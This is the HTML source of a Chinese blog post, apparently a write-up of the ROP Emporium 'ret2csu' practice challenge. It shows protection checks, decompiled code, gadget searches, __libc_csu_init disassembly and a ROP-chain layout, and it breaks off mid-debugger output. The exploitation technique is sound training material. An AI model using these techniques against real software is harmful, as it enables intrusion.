@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guoxb.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ret2csu题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;ret2csu.html 参考博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Ga4ra&#x2F;article&#x2F;details&#x2F;123791650 x64根据题目名称以及给出的提示，明显我们需要使用ret2csu，有关ret2csu的知识移步《看雪pwn入门篇》或者直接百度。这里我们还是按照常规思路来分析下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Challenge8_ret2csu">
+<meta property="og:url" content="http://guoxb.top/2023/03/28/ROP_Emporium/Challenge8-ret2csu/index.html">
+<meta property="og:site_name" content="GuoXB&#39;s Blog">
+<meta property="og:description" content="ret2csu题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;ret2csu.html 参考博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Ga4ra&#x2F;article&#x2F;details&#x2F;123791650 x64根据题目名称以及给出的提示，明显我们需要使用ret2csu，有关ret2csu的知识移步《看雪pwn入门篇》或者直接百度。这里我们还是按照常规思路来分析下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321202753801.png">
+<meta property="article:published_time" content="2023-03-28T13:56:54.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:01:12.897Z">
+<meta property="article:author" content="郭小白QAQ">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321202753801.png">
+
+<link rel="canonical" href="http://guoxb.top/2023/03/28/ROP_Emporium/Challenge8-ret2csu/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Challenge8_ret2csu | GuoXB's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">GuoXB's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://guoxb.top/2023/03/28/ROP_Emporium/Challenge8-ret2csu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+      <meta itemprop="name" content="郭小白QAQ">
+      <meta itemprop="description" content="精彩不亮丽，起落是无常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GuoXB's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Challenge8_ret2csu
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-28 21:56:54 / 修改时间：22:01:12" itemprop="dateCreated datePublished" datetime="2023-03-28T21:56:54+08:00">2023-03-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ROP-Emporium/" itemprop="url" rel="index"><span itemprop="name">ROP_Emporium</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://ropemporium.com/challenge/ret2csu.html">https://ropemporium.com/challenge/ret2csu.html</a></p>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Ga4ra/article/details/123791650">https://blog.csdn.net/Ga4ra/article/details/123791650</a></p>
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>根据题目名称以及给出的提示，明显我们需要使用ret2csu，有关ret2csu的知识移步《看雪pwn入门篇》或者直接百度。这里我们还是按照常规思路来分析下。</p>
+<span id="more"></span>
+
+<p>首先查看程序保护情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./ret2csu</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level8_ret2csu/64/ret2csu&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到程序开启了NX保护。</p>
+<p>接着我们使用radare2来查看程序中的函数信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./ret2csu</span> </span><br><span class="line"><span class="meta prompt_">[0x00400520]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x00400520    1     42 entry0</span><br><span class="line">0x004004d0    3     23 sym._init</span><br><span class="line">0x004006b4    1      9 sym._fini</span><br><span class="line">0x00400560    4     37 sym.deregister_tm_clones</span><br><span class="line">0x00400590    4     55 sym.register_tm_clones</span><br><span class="line">0x004005d0    3     29 sym.__do_global_dtors_aux</span><br><span class="line">0x00400600    1      7 sym.frame_dummy</span><br><span class="line">0x00400617    1     27 sym.usefulFunction</span><br><span class="line">0x00400510    1      6 sym.imp.ret2win</span><br><span class="line">0x004006b0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x00400640    4    101 sym.__libc_csu_init</span><br><span class="line">0x00400550    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x00400607    1     16 main</span><br><span class="line">0x00400500    1      6 sym.imp.pwnme</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，pwnme和ret2win这次在链接库中，我们先来查看下usefulFunction函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x00400520</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x00400617</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.ret2win(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，usefulFunction函数调用了链接库中的ret2win函数，这里一开始我觉的没什么用，后来想了想，正是由于这里调用了ret2win，我们才能直接在后续构造ROP链的时候，通过<code>elf.plt[&#39;ret2win&#39;]</code>来实现对ret2win函数的调用，而不用泄露libc的地址。</p>
+<p>我们接着进入链接库中，查看pwnme和ret2win：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -A ./libret2csu.so </span><br><span class="line">[<span class="number">0x00000860</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x0000093a</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    ulong buf;</span><br><span class="line">    </span><br><span class="line">    sym.imp.setvbuf(*_reloc.<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xc88</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xca0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xca8</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0xd12</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xd15</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到read处存在栈溢出，并且溢出空间比较大。ret2win函数我们使用IDA来查看，IDA相比radare2还是要更直观一些。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，ret2win函数需要三个参数<code>0xdeadbeefdeadbeef</code> <code> 0xcafebabecafebabe</code>   <code>0xd00df00dd00df00d</code>，然后解密文件，输出flag。</p>
+<p>看到这里我们的大致思路就有了。</p>
+<ul>
+<li>通过pop rdi，rsi，rdx或者mov rdi等这类的gadgets来传递参数</li>
+<li>覆盖返回地址为ret2win@plt地址来调用函数，获取gadgets</li>
+</ul>
+<p>接下来就是找gadgets：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ret2csu --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a2 : pop r15 ; ret</span><br><span class="line">0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400588 : pop rbp ; ret</span><br><span class="line">0x00000000004006a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004e6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到，并没有对rdx操作的寄存器，我们在pwndbg中再查找下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">rop --grep <span class="string">&#x27;rdx&#x27;</span></span></span><br><span class="line">0x00000000004004dd : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里也没有找到有用的gadget，当我们缺少传递参数的gadgets时，我们就要用到ret2csu方法，这个方法能够实现万能传参。</p>
+<p>我们来具体查看下这段gadgets：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -dj .text ./ret2csu</span></span><br><span class="line">···</span><br><span class="line">0000000000400640 &lt;__libc_csu_init&gt;:</span><br><span class="line">···</span><br><span class="line">  400680:	4c 89 fa             	mov    rdx,r15</span><br><span class="line">  400683:	4c 89 f6             	mov    rsi,r14</span><br><span class="line">  400686:	44 89 ef             	mov    edi,r13d</span><br><span class="line">  400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</span><br><span class="line">  40068d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line">  400691:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line">  400694:	75 ea                	jne    400680 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400696:	48 83 c4 08          	add    rsp,0x8</span><br><span class="line">  40069a:	5b                   	pop    rbx</span><br><span class="line">  40069b:	5d                   	pop    rbp</span><br><span class="line">  40069c:	41 5c                	pop    r12</span><br><span class="line">  40069e:	41 5d                	pop    r13</span><br><span class="line">  4006a0:	41 5e                	pop    r14</span><br><span class="line">  4006a2:	41 5f                	pop    r15</span><br><span class="line">  4006a4:	c3                   	ret </span><br></pre></td></tr></table></figure>
+
+<p>我们主要用到的就是<code>__libc_csu_init</code>函数的这部分，这部分又常拆分为两部分用，<code>40069a</code>用来向寄存器传递值，<code>400680</code>用来向参数寄存器传递参数。</p>
+<p>结合我们的思路，我们用ret2csu来构造的ROP如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x40069a	#pop rbx; rbp; r12; r13; r14; r15; ret</span><br><span class="line">0			#rbx</span><br><span class="line">1			#rbp</span><br><span class="line">r12			#call [r12]</span><br><span class="line">r13			#mov edi,r13d</span><br><span class="line">r14			#mov rsi,r14</span><br><span class="line">r15			#mov rdx,r15</span><br><span class="line">0x400680	#mov</span><br><span class="line">pop rdi</span><br><span class="line">argv_rdi</span><br><span class="line">ret2win@plt</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要注意的有两点：</p>
+<p>第一：这里操作的是edi，也就是只对rdi的低32位进行了赋值，而我们传递的参数高32位也是有值的，所以，我们还需要再通过一个对rdi操作的gadget来传递完整的参数。</p>
+<p>我们从上边的gadgets可以找到：<code>0x00000000004006a3 : pop rdi ; ret</code></p>
+<p>第二：由于我们这里不需要泄露libc的地址，并且<code>rbx=0</code>，所以这里的指令 <code>call [r12]</code>，需要一个能ret的函数，而且这个函数内部不能有影响堆栈平衡和寄存器值的指令。注意，填在<code>r12</code>处的地址需要解引用，类似got这样的跳转表，我们不能直接填入函数地址。</p>
+<p>pwndbg工具提供了telescope命令，翻译为望远镜很形象：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">help</span> telescope</span></span><br><span class="line">Recursively dereferences pointers starting at the specified address</span><br></pre></td></tr></table></figure>
+
+<p>除了got，dynamic，init_array，fini_array这几个section也可以试一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S ret2csu</span><br><span class="line">There are 29 section headers, starting at offset 0x1930:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  ...</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00</span><br><span class="line">       00000000000001f0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000028  0000000000000008  WA       0     0     8</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600df0 2		# init_array + fini_array</span><br><span class="line">00:0000│  0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy) ◂— push   rbp</span><br><span class="line">01:0008│  0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200a61], 0</span><br><span class="line">pwndbg&gt; telescope 0x0000000000600e00 62		# dynamic</span><br><span class="line">00:0000│  0x600e00 (_DYNAMIC) ◂— 0x1</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">...</span><br><span class="line">07:0038│  0x600e38 (_DYNAMIC+56) —▸ 0x4004d0 (_init) ◂— sub    rsp, 8		!!!!!!!!!!!!!</span><br><span class="line">08:0040│  0x600e40 (_DYNAMIC+64) ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">09:0048│  0x600e48 (_DYNAMIC+72) —▸ 0x4006b4 (_fini) ◂— sub    rsp, 8		!!!!!!!!!!!!!</span><br><span class="line">0a:0050│  0x600e50 (_DYNAMIC+80) ◂— 0x19</span><br><span class="line">0b:0058│  0x600e58 (_DYNAMIC+88) —▸ 0x600df0 (__init_array_start) —▸ 0x400600 (frame_dummy) ◂— push   rbp	!!!!!!!!!!!!!!</span><br><span class="line">...</span><br><span class="line">0f:0078│  0x600e78 (_DYNAMIC+120) —▸ 0x600df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4005d0 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200a61], 0</span><br><span class="line">...</span><br><span class="line">13:0098│  0x600e98 (_DYNAMIC+152) —▸ 0x400298 ◂— add    eax, dword ptr [rax]</span><br><span class="line">14:00a0│  0x600ea0 